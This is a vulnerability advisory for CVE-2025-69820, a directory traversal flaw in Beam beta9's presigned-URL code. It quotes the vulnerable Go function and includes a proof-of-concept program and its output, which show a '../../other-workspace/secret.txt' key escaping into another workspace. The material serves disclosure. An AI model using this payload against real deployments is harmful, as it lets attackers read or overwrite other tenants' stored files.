## CVE-2025-69820

### Description:
Directory Traversal vulnerability in Beam beta9 v.0.1.552 allows a remote attacker to read or modify sensitive information via the `joinCleanPath` function.

### Impact:
Attackers could potentially access files in the cloud that were not originally intended by the developers.

### Details:
The module responsible for creating Presigned URLs incorrectly normalizes the user-provided ObjectKey. When generating a Presigned URL, the raw ObjectKey from the user should be used directly. However, the current code sanitizes the key using `joinCleanPath` before passing it to the presign client.
This vulnerability allows an attacker to provide a specially crafted ObjectKey to access (GET) or overwrite (PUT) objects that are not meant to be accessible. This could lead to unauthorized data access or modification.

`beta9/pkg/abstractions/volume/multipart.go`L45-51
```go
func joinCleanPath(parts ...string) string {
	for i, part := range parts {
		parts[i] = filepath.Clean(part)
	}
	return filepath.Join(parts...)
}
```

`beta9/pkg/abstractions/volume/multipart.go` L60\~71\~113\~139
```go
func (s *GlobalVolumeService) CreatePresignedURL(ctx context.Context, in *pb.CreatePresignedURLRequest) (*pb.CreatePresignedURLResponse, error) {
・・・
	var s3Client *s3.Client
	var presignClient *s3.PresignClient

	key := joinCleanPath(types.DefaultVolumesPrefix, authInfo.Workspace.Name, volume.ExternalId, in.VolumePath)
	bucket := s.config.BucketName

	if authInfo.Workspace.StorageAvailable() {
		storageClient, err := clients.NewWorkspaceStorageClient(ctx, authInfo.Workspace.Name, authInfo.Workspace.Storage)
		if err != nil {
			return &pb.CreatePresignedURLResponse{
				Ok:     false,
				ErrMsg: err.Error(),
			}, nil
		}

		s3Client = storageClient.S3Client()
		presignClient = storageClient.PresignClient()
		key = joinCleanPath(types.DefaultVolumesPrefix, volume.ExternalId, in.VolumePath)
		bucket = storageClient.BucketName()
	} else {
		s3Client = s.getS3Client()
		presignClient = s3.NewPresignClient(s3Client)
	}
・・・
	switch in.Method {
	case pb.PresignedURLMethod_HeadObject:
		req, err = presignClient.PresignHeadObject(
			ctx, &s3.HeadObjectInput{
				Bucket: aws.String(bucket),
				Key:    aws.String(key),
			},
			options...,
		)
	case pb.PresignedURLMethod_GetObject:
		req, err = presignClient.PresignGetObject(
			ctx, &s3.GetObjectInput{
				Bucket: aws.String(bucket),
				Key:    aws.String(key),
			},
			options...,
		)
	case pb.PresignedURLMethod_PutObject:
		req, err = presignClient.PresignPutObject(
			ctx, &s3.PutObjectInput{
				Bucket:        aws.String(bucket),
				Key:           aws.String(key),
				ContentType:   aws.String(in.Params.ContentType),
				ContentLength: aws.Int64(int64(in.Params.ContentLength)),
			},
			options...,
		)
```

### Proof-of-Concept Exploit
This demonstration shows that the `joinCleanPath` function ensures presigned URLs are issued with normalized paths.
```go
package main

import (
	"context"
	"fmt"
	"path/filepath"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/s3"
)

// 1. Provided path normalization function
func joinCleanPath(parts ...string) string {
	for i, part := range parts {
		parts[i] = filepath.Clean(part)
	}
	return filepath.Join(parts...)
}

func main() {
	ctx := context.TODO()

	// 2. AWS SDK v2 client configuration
	staticCreds := credentials.NewStaticCredentialsProvider("AKIA_MOCK_KEY", "MOCK_SECRET_KEY", "")

	s3Client := s3.New(s3.Options{
		Region:       "ap-northeast-1",
		Credentials:  staticCreds,
		BaseEndpoint: aws.String("https://s3.ap-northeast-1.amazonaws.com"),
	})

	// Create a PresignClient for generating signed URLs
	presignClient := s3.NewPresignClient(s3Client)

	bucket := "my-secure-bucket"
	basePrefix := "volumes/workspace-a/vol-1"
	maliciousPath := "../../other-workspace/secret.txt" // Attempting to escape to the parent directory

	// 4. Execute path normalization
	// The "../" components are resolved by filepath.Join inside joinCleanPath.
	normalizedKey := joinCleanPath(basePrefix, maliciousPath)

	// 5. Issue a presigned URL (GetObject)
	presignedReq, err := presignClient.PresignGetObject(ctx, &s3.GetObjectInput{
		Bucket: aws.String(bucket),
		Key:    aws.String(normalizedKey),
	}, func(o *s3.PresignOptions) {
		o.Expires = 15 * time.Minute
	})

	if err != nil {
		panic(fmt.Sprintf("failed to presign request: %v", err))
	}

	// Display the results
	fmt.Printf("--- Path Normalization Result ---\n")
	fmt.Printf("Target Bucket  : %s\n", bucket)
	fmt.Printf("Input Prefix   : %s\n", basePrefix)
	fmt.Printf("Input Path     : %s\n", maliciousPath)
	fmt.Printf("Normalized Key : %s\n", normalizedKey) // Verify that "../" has been resolved/removed
	fmt.Printf("\n--- Generated Presigned URL ---\n")
	fmt.Printf("URL: %s\n", presignedReq.URL)
}
```
result
```bash
~/tmp/test $ go run test.go
--- Path Normalization Result ---
Target Bucket  : my-secure-bucket
Input Prefix   : volumes/workspace-a/vol-1
Input Path     : ../../other-workspace/secret.txt
Normalized Key : volumes/other-workspace/secret.txt

--- Generated Presigned URL ---
URL: https://my-secure-bucket.s3.ap-northeast-1.amazonaws.com/volumes/other-workspace/secret.txt?X-Amz-Algorithm=...
```